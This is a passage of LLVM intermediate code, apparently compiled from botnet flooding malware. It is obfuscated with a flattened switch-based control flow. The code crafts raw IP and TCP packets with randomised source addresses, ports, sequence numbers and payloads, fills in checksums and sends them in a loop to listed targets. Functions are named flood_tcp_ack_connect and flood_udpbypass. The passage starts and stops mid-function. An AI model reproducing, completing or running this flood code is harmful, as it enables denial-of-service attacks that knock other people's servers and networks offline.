  %224 = select i1 %223, i32 -1998630921, i32 -763972628
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i16, i16* %6, align 2
  %227 = load i32*, i32** %22, align 8
  %228 = load i32, i32* %3, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds i32, i32* %227, i64 %229
  %231 = load i32, i32* %230, align 4
  %232 = load %struct.arguments*, %struct.arguments** %2, align 8
  %233 = getelementptr inbounds %struct.arguments, %struct.arguments* %232, i32 0, i32 0
  %234 = load %struct.target*, %struct.target** %233, align 8
  %235 = load i32, i32* %3, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.target, %struct.target* %234, i64 %236
  %238 = getelementptr inbounds %struct.target, %struct.target* %237, i32 0, i32 0
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* %19, align 4
  %241 = load i16, i16* %8, align 2
  %242 = zext i16 %241 to i32
  %243 = call i32 @tcp_handshake(i16 zeroext %226, i32 %231, i32 %239, i32 %240, i32 %242)
  store i32 -763972628, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i16, i16* %5, align 2
  %246 = zext i16 %245 to i32
  %247 = add nsw i32 %246, 110
  %248 = sext i32 %247 to i64
  %249 = call noalias i8* @malloc(i64 %248) #8
  %250 = load i8**, i8*** %9, align 8
  %251 = load i32, i32* %3, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds i8*, i8** %250, i64 %252
  store i8* %249, i8** %253, align 8
  %254 = load i8**, i8*** %9, align 8
  %255 = load i32, i32* %3, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds i8*, i8** %254, i64 %256
  %258 = load i8*, i8** %257, align 8
  %259 = icmp ne i8* %258, null
  %260 = select i1 %259, i32 194644908, i32 811831845
  store i32 %260, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8**, i8*** %9, align 8
  %263 = bitcast i8** %262 to i8*
  call void @free(i8* %263) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i8**, i8*** %9, align 8
  %266 = load i32, i32* %3, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds i8*, i8** %265, i64 %267
  %269 = load i8*, i8** %268, align 8
  %270 = bitcast i8* %269 to %struct.iphdr*
  store %struct.iphdr* %270, %struct.iphdr** %24, align 8
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i64 1
  %273 = bitcast %struct.iphdr* %272 to %struct.tcphdr*
  store %struct.tcphdr* %273, %struct.tcphdr** %25, align 8
  %274 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i64 1
  %276 = bitcast %struct.tcphdr* %275 to i8*
  store i8* %276, i8** %26, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %278 = bitcast %struct.iphdr* %277 to i8*
  %279 = load i8, i8* %278, align 4
  %280 = and i8 %279, 15
  %281 = or i8 %280, 64
  store i8 %281, i8* %278, align 4
  %282 = load i8, i8* %16, align 1
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 1
  store i8 %282, i8* %284, align 1
  %285 = load i16, i16* %5, align 2
  %286 = zext i16 %285 to i64
  %287 = add i64 40, %286
  %288 = trunc i64 %287 to i16
  %289 = call zeroext i16 @htons(i16 zeroext %288) #9
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 2
  store i16 %289, i16* %291, align 2
  %292 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %293 = bitcast %struct.iphdr* %292 to i8*
  %294 = load i8, i8* %293, align 4
  %295 = and i8 %294, -16
  %296 = or i8 %295, 5
  store i8 %296, i8* %293, align 4
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 4
  store i16 0, i16* %298, align 2
  %299 = load i8, i8* %7, align 1
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 5
  store i8 %299, i8* %301, align 4
  %302 = load i16, i16* %17, align 2
  %303 = call zeroext i16 @htons(i16 zeroext %302) #9
  %304 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 3
  store i16 %303, i16* %305, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 6
  store i8 6, i8* %307, align 1
  %308 = load i32, i32* %19, align 4
  %309 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 8
  store i32 %308, i32* %310, align 4
  %311 = load %struct.arguments*, %struct.arguments** %2, align 8
  %312 = getelementptr inbounds %struct.arguments, %struct.arguments* %311, i32 0, i32 0
  %313 = load %struct.target*, %struct.target** %312, align 8
  %314 = load i32, i32* %3, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.target, %struct.target* %313, i64 %315
  %317 = getelementptr inbounds %struct.target, %struct.target* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 4
  %319 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 9
  store i32 %318, i32* %320, align 4
  %321 = load i16, i16* %6, align 2
  %322 = call zeroext i16 @htons(i16 zeroext %321) #9
  %323 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 0
  %325 = bitcast %union.anon* %324 to %struct.anon.0*
  %326 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %325, i32 0, i32 1
  store i16 %322, i16* %326, align 2
  %327 = load i16, i16* %8, align 2
  %328 = call zeroext i16 @htons(i16 zeroext %327) #9
  %329 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i32 0, i32 0
  %331 = bitcast %union.anon* %330 to %struct.anon.0*
  %332 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %331, i32 0, i32 0
  store i16 %328, i16* %332, align 4
  %333 = load i32, i32* %18, align 4
  %334 = trunc i32 %333 to i16
  %335 = call zeroext i16 @htons(i16 zeroext %334) #9
  %336 = zext i16 %335 to i32
  %337 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %338 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %337, i32 0, i32 0
  %339 = bitcast %union.anon* %338 to %struct.anon.0*
  %340 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %339, i32 0, i32 2
  store i32 %336, i32* %340, align 4
  %341 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 0
  %343 = bitcast %union.anon* %342 to %struct.anon.0*
  %344 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %343, i32 0, i32 4
  %345 = load i16, i16* %344, align 4
  %346 = and i16 %345, -241
  %347 = or i16 %346, 80
  store i16 %347, i16* %344, align 4
  %348 = load i8, i8* %10, align 1
  %349 = sext i8 %348 to i16
  %350 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon* %351 to %struct.anon.0*
  %353 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %352, i32 0, i32 4
  %354 = load i16, i16* %353, align 4
  %355 = and i16 %349, 1
  %356 = shl i16 %355, 12
  %357 = and i16 %354, -4097
  %358 = or i16 %357, %356
  store i16 %358, i16* %353, align 4
  %359 = load i8, i8* %11, align 1
  %360 = sext i8 %359 to i16
  %361 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %362 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %361, i32 0, i32 0
  %363 = bitcast %union.anon* %362 to %struct.anon.0*
  %364 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 4
  %366 = and i16 %360, 1
  %367 = shl i16 %366, 8
  %368 = and i16 %365, -257
  %369 = or i16 %368, %367
  store i16 %369, i16* %364, align 4
  %370 = load i8, i8* %12, align 1
  %371 = sext i8 %370 to i16
  %372 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 0
  %374 = bitcast %union.anon* %373 to %struct.anon.0*
  %375 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %374, i32 0, i32 4
  %376 = load i16, i16* %375, align 4
  %377 = and i16 %371, 1
  %378 = shl i16 %377, 13
  %379 = and i16 %376, -8193
  %380 = or i16 %379, %378
  store i16 %380, i16* %375, align 4
  %381 = load i8, i8* %13, align 1
  %382 = sext i8 %381 to i16
  %383 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 0
  %385 = bitcast %union.anon* %384 to %struct.anon.0*
  %386 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %385, i32 0, i32 4
  %387 = load i16, i16* %386, align 4
  %388 = and i16 %382, 1
  %389 = shl i16 %388, 11
  %390 = and i16 %387, -2049
  %391 = or i16 %390, %389
  store i16 %391, i16* %386, align 4
  %392 = load i8, i8* %14, align 1
  %393 = sext i8 %392 to i16
  %394 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon* %395 to %struct.anon.0*
  %397 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %396, i32 0, i32 4
  %398 = load i16, i16* %397, align 4
  %399 = and i16 %393, 1
  %400 = shl i16 %399, 10
  %401 = and i16 %398, -1025
  %402 = or i16 %401, %400
  store i16 %402, i16* %397, align 4
  %403 = load i8, i8* %15, align 1
  %404 = sext i8 %403 to i16
  %405 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %406 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %405, i32 0, i32 0
  %407 = bitcast %union.anon* %406 to %struct.anon.0*
  %408 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %404, 1
  %411 = shl i16 %410, 9
  %412 = and i16 %409, -513
  %413 = or i16 %412, %411
  store i16 %413, i16* %408, align 4
  %414 = call i32 @rand_new()
  %415 = and i32 %414, 65535
  %416 = trunc i32 %415 to i16
  %417 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %418 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %417, i32 0, i32 0
  %419 = bitcast %union.anon* %418 to %struct.anon.0*
  %420 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %419, i32 0, i32 5
  store i16 %416, i16* %420, align 2
  %421 = load i32, i32* %20, align 4
  %422 = trunc i32 %421 to i16
  %423 = call zeroext i16 @htons(i16 zeroext %422) #9
  %424 = zext i16 %423 to i32
  %425 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 0
  %427 = bitcast %union.anon* %426 to %struct.anon.0*
  %428 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %427, i32 0, i32 3
  store i32 %424, i32* %428, align 4
  %429 = load i8*, i8** %26, align 8
  %430 = load i16, i16* %5, align 2
  %431 = zext i16 %430 to i32
  call void @rand_string(i8* %429, i32 %431)
  store i32 81415637, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i32, i32* %3, align 4
  %434 = add nsw i32 %433, 1
  store i32 %434, i32* %3, align 4
  store i32 1357273157, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  store i32 -75550381, i32* %switchVar
  br label %loopEnd

; <label>:436:                                    ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1864056764, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load i32, i32* %3, align 4
  %439 = load %struct.arguments*, %struct.arguments** %2, align 8
  %440 = getelementptr inbounds %struct.arguments, %struct.arguments* %439, i32 0, i32 3
  %441 = load i8, i8* %440, align 1
  %442 = zext i8 %441 to i32
  %443 = icmp slt i32 %438, %442
  %444 = select i1 %443, i32 -1287644358, i32 -1746399963
  store i32 %444, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i8**, i8*** %9, align 8
  %447 = load i32, i32* %3, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds i8*, i8** %446, i64 %448
  %450 = load i8*, i8** %449, align 8
  %451 = bitcast i8* %450 to %struct.iphdr*
  store %struct.iphdr* %451, %struct.iphdr** %27, align 8
  %452 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i64 1
  %454 = bitcast %struct.iphdr* %453 to %struct.tcphdr*
  store %struct.tcphdr* %454, %struct.tcphdr** %28, align 8
  %455 = load %struct.arguments*, %struct.arguments** %2, align 8
  %456 = getelementptr inbounds %struct.arguments, %struct.arguments* %455, i32 0, i32 0
  %457 = load %struct.target*, %struct.target** %456, align 8
  %458 = load i32, i32* %3, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.target, %struct.target* %457, i64 %459
  %461 = getelementptr inbounds %struct.target, %struct.target* %460, i32 0, i32 1
  %462 = load i16, i16* %461, align 4
  %463 = zext i16 %462 to i32
  %464 = icmp slt i32 %463, 32
  %465 = select i1 %464, i32 -565011912, i32 258332081
  store i32 %465, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 9
  %469 = load i32, i32* %468, align 4
  %470 = call i32 @ntohl(i32 %469) #9
  %471 = call i32 @rand_new()
  %472 = load %struct.arguments*, %struct.arguments** %2, align 8
  %473 = getelementptr inbounds %struct.arguments, %struct.arguments* %472, i32 0, i32 0
  %474 = load %struct.target*, %struct.target** %473, align 8
  %475 = load i32, i32* %3, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.target, %struct.target* %474, i64 %476
  %478 = getelementptr inbounds %struct.target, %struct.target* %477, i32 0, i32 1
  %479 = load i16, i16* %478, align 4
  %480 = zext i16 %479 to i32
  %481 = lshr i32 %471, %480
  %482 = add i32 %470, %481
  %483 = call i32 @htonl(i32 %482) #9
  %484 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 9
  store i32 %483, i32* %485, align 4
  store i32 258332081, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 8
  %489 = load i32, i32* %488, align 4
  %490 = icmp eq i32 %489, -1
  %491 = select i1 %490, i32 -406490723, i32 1225818031
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = call i32 @rand_new()
  %494 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 8
  store i32 %493, i32* %495, align 4
  store i32 1225818031, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 3
  %499 = load i16, i16* %498, align 4
  %500 = zext i16 %499 to i32
  %501 = icmp eq i32 %500, 65535
  %502 = select i1 %501, i32 -1569554111, i32 1654936832
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = call i32 @rand_new()
  %505 = and i32 %504, 65535
  %506 = trunc i32 %505 to i16
  %507 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 3
  store i16 %506, i16* %508, align 4
  store i32 1654936832, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 0
  %512 = bitcast %union.anon* %511 to %struct.anon.0*
  %513 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %512, i32 0, i32 1
  %514 = load i16, i16* %513, align 2
  %515 = zext i16 %514 to i32
  %516 = icmp eq i32 %515, 65535
  %517 = select i1 %516, i32 -495722460, i32 179436
  store i32 %517, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = call i32 @rand_new()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 0
  %524 = bitcast %union.anon* %523 to %struct.anon.0*
  %525 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %524, i32 0, i32 1
  store i16 %521, i16* %525, align 2
  store i32 179436, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %528 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %527, i32 0, i32 0
  %529 = bitcast %union.anon* %528 to %struct.anon.0*
  %530 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %529, i32 0, i32 0
  %531 = load i16, i16* %530, align 4
  %532 = zext i16 %531 to i32
  %533 = icmp eq i32 %532, 65535
  %534 = select i1 %533, i32 -1589501091, i32 -1043821957
  store i32 %534, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  %536 = call i32 @rand_new()
  %537 = and i32 %536, 65535
  %538 = trunc i32 %537 to i16
  %539 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 0
  %541 = bitcast %union.anon* %540 to %struct.anon.0*
  %542 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %541, i32 0, i32 0
  store i16 %538, i16* %542, align 4
  store i32 -1043821957, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 0
  %546 = bitcast %union.anon* %545 to %struct.anon.0*
  %547 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %546, i32 0, i32 2
  %548 = load i32, i32* %547, align 4
  %549 = icmp eq i32 %548, 65535
  %550 = select i1 %549, i32 1668303841, i32 -1746486387
  store i32 %550, i32* %switchVar
  br label %loopEnd

; <label>:551:                                    ; preds = %loopEntry
  %552 = call i32 @rand_new()
  %553 = and i32 %552, 65535
  %554 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 0
  %556 = bitcast %union.anon* %555 to %struct.anon.0*
  %557 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %556, i32 0, i32 2
  store i32 %553, i32* %557, align 4
  store i32 -1746486387, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  %559 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 0
  %561 = bitcast %union.anon* %560 to %struct.anon.0*
  %562 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %561, i32 0, i32 3
  %563 = load i32, i32* %562, align 4
  %564 = icmp eq i32 %563, 65535
  %565 = select i1 %564, i32 489795383, i32 84790687
  store i32 %565, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = call i32 @rand_new()
  %568 = and i32 %567, 65535
  %569 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 0
  %571 = bitcast %union.anon* %570 to %struct.anon.0*
  %572 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %571, i32 0, i32 3
  store i32 %568, i32* %572, align 4
  store i32 84790687, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %574 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 7
  store i16 0, i16* %575, align 2
  %576 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %577 = bitcast %struct.iphdr* %576 to i16*
  %578 = call zeroext i16 @ip_header_checksum(i16* %577, i32 20)
  %579 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 7
  store i16 %578, i16* %580, align 2
  %581 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 0
  %583 = bitcast %union.anon* %582 to %struct.anon.0*
  %584 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %583, i32 0, i32 6
  store i16 0, i16* %584, align 4
  %585 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %586 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %587 = bitcast %struct.tcphdr* %586 to i8*
  %588 = load i16, i16* %5, align 2
  %589 = zext i16 %588 to i64
  %590 = add i64 20, %589
  %591 = trunc i64 %590 to i16
  %592 = call zeroext i16 @htons(i16 zeroext %591) #9
  %593 = load i16, i16* %5, align 2
  %594 = zext i16 %593 to i64
  %595 = add i64 20, %594
  %596 = trunc i64 %595 to i32
  %597 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %585, i8* %587, i16 zeroext %592, i32 %596)
  %598 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 0
  %600 = bitcast %union.anon* %599 to %struct.anon.0*
  %601 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %600, i32 0, i32 6
  store i16 %597, i16* %601, align 4
  %602 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %602, align 4
  %603 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %604 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %603, i32 0, i32 0
  %605 = bitcast %union.anon* %604 to %struct.anon.0*
  %606 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %605, i32 0, i32 1
  %607 = load i16, i16* %606, align 2
  %608 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %607, i16* %608, align 2
  %609 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 9
  %611 = load i32, i32* %610, align 4
  %612 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %613 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %612, i32 0, i32 0
  store i32 %611, i32* %613, align 4
  %614 = load i32*, i32** %22, align 8
  %615 = load i32, i32* %3, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds i32, i32* %614, i64 %616
  %618 = load i32, i32* %617, align 4
  %619 = load i8**, i8*** %9, align 8
  %620 = load i32, i32* %3, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds i8*, i8** %619, i64 %621
  %623 = load i8*, i8** %622, align 8
  %624 = load i16, i16* %5, align 2
  %625 = zext i16 %624 to i64
  %626 = add i64 40, %625
  %627 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %628 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %628, %struct.sockaddr** %627, align 8
  %629 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %630 = load %struct.sockaddr*, %struct.sockaddr** %629, align 8
  %631 = call i64 @sendto(i32 %618, i8* %623, i64 %626, i32 16384, %struct.sockaddr* %630, i32 16)
  store i32 467889836, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i32, i32* %3, align 4
  %634 = add nsw i32 %633, 1
  store i32 %634, i32* %3, align 4
  store i32 -1864056764, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  store i32 -75550381, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %635, %632, %573, %566, %558, %551, %543, %535, %526, %518, %509, %503, %496, %492, %486, %466, %445, %437, %436, %435, %432, %264, %244, %225, %221, %208, %192, %184, %183, %172, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_ack_connect(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @flood_udpbypass(%struct.arguments*) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %12 = alloca i32, align 4
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %13 = load %struct.arguments*, %struct.arguments** %2, align 8
  %14 = getelementptr inbounds %struct.arguments, %struct.arguments* %13, i32 0, i32 3
  %15 = load i8, i8* %14, align 1
  %16 = zext i8 %15 to i64
  %17 = call noalias i8* @calloc(i64 %16, i64 4) #8
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %7, align 8
  %19 = load i32*, i32** %7, align 8
  store i32* %19, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -1860794317, i32* %switchVar
  %.reg2mem2 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1860794317, label %first
    i32 -1629667691, label %22
    i32 -1512740556, label %23
    i32 1143573176, label %24
    i32 -231069994, label %32
    i32 -1883050018, label %56
    i32 531259781, label %57
    i32 1859340586, label %89
    i32 -863629915, label %112
    i32 -1100188809, label %121
    i32 -480431623, label %134
    i32 -1538045769, label %137
    i32 -187238082, label %138
    i32 402860823, label %139
    i32 1369528229, label %147
    i32 347317047, label %155
    i32 103099940, label %161
    i32 -766712643, label %169
    i32 1438844193, label %172
    i32 1687809004, label %182
    i32 1726181167, label %185
    i32 1761892114, label %186
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %20 = icmp ne i32* %.reload, null
  %21 = select i1 %20, i32 -1512740556, i32 -1629667691
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:23:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1143573176, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load %struct.arguments*, %struct.arguments** %2, align 8
  %27 = getelementptr inbounds %struct.arguments, %struct.arguments* %26, i32 0, i32 3
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp slt i32 %25, %29
  %31 = select i1 %30, i32 -231069994, i32 -1538045769
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load %struct.arguments*, %struct.arguments** %2, align 8
  %34 = getelementptr inbounds %struct.arguments, %struct.arguments* %33, i32 0, i32 1
  %35 = load %struct.option*, %struct.option** %34, align 8
  %36 = load %struct.arguments*, %struct.arguments** %2, align 8
  %37 = getelementptr inbounds %struct.arguments, %struct.arguments* %36, i32 0, i32 2
  %38 = load i8, i8* %37, align 8
  %39 = call i32 @rand() #8
